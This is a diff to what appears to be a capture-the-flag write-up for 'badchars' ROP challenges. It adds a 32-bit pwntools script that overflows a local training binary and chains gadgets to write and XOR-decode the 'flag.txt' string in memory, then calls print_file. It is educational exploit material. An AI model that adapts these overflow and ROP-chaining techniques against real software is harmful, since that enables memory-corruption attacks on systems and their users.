@@ -192,6 +192,7 @@ io.interactive()
 Some characters are not allowed (xor to store data, xor to get it back while in memory).
 
 64-bit
+
 ```python
 from pwn import *
 
@@ -226,3 +227,44 @@ io.sendline(payload)
 io.interactive()
 ```
 
+32-bit
+
+```python
+from pwn import *
+
+# 0x80485bb : pop ebp ; ret
+# 0x804839d : pop ebx ; ret
+# 0x8048543 : add BYTE PTR [ebp+0x0], bl
+
+# offset for overflow
+payload = b'A'*44
+
+# write filename to memory
+# 0x80485b9 : pop esi ; pop edi ; pop ebp ; ret
+# 0x804854f : mov dword ptr [edi], esi ; ret
+
+writeable = 0x804a032
+
+# we can't store the "flag.txt" string on the stack
+# because the stack is used by fopen and the string
+# gets modified
+
+payload += p32(0x80485b9) + b'ci^d' + p32(writeable) + b'BBBB' + p32(0x804854f)
+payload += p32(0x80485b9) + b'+quq' + p32(writeable+4) + b'BBBB' + p32(0x804854f)
+
+# xoring the filename in memory
+for i in range(8):
+    payload += p32(0x80485bb) + p32(writeable+i)
+    payload += p32(0x804839d) + p32(3)
+    payload += p32(0x8048543)
+
+# reading and displaying file contents
+print_file = 0xf7fc87cf
+payload += p32(print_file) + b'BBBB' + p32(writeable)
+
+# io = gdb.debug('./badchars32', 'b*pwnme+273')
+# io = gdb.debug('./badchars32', 'b*print_file+38')
+io = process('./badchars32')
+io.sendline(payload)
+io.interactive()
+```
